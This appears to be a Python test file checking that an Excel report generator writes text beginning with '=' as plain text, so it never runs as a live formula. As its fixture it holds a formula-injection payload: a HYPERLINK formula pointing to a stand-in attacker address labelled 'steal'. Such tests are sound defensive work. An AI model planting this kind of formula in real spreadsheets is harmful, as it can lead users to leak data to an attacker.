"""Excel report: document/model/user text must never become a live formula."""

import io

from openpyxl import load_workbook

from contracts import AskResponse, Citation, Label, Tier
from deliver.xlsx import build_report

INJECTED = '=HYPERLINK("http://evil.example/steal","click here")'


def test_text_starting_with_equals_is_stored_as_plain_text():
    response = AskResponse(
        status="answered",
        answer=f"{INJECTED}\nNormal finding line.",
        citations=[Citation(doc_id="sop-101", page=4, quote="=1+1 is written in this manual page")],
        denials=[],
        effective_label=Label(tier=Tier.INTERNAL, compartments=frozenset()),
        ledger_row_id=7,
    )
    wb = load_workbook(io.BytesIO(build_report(response, question="=2+2 what is this")))

    cells = [c for ws in wb.worksheets for row in ws.iter_rows() for c in row if c.value is not None]
    assert not [c.coordinate for c in cells if c.data_type == "f"]
    values = {c.value for c in cells}
    assert INJECTED in values
    assert "=1+1 is written in this manual page" in values
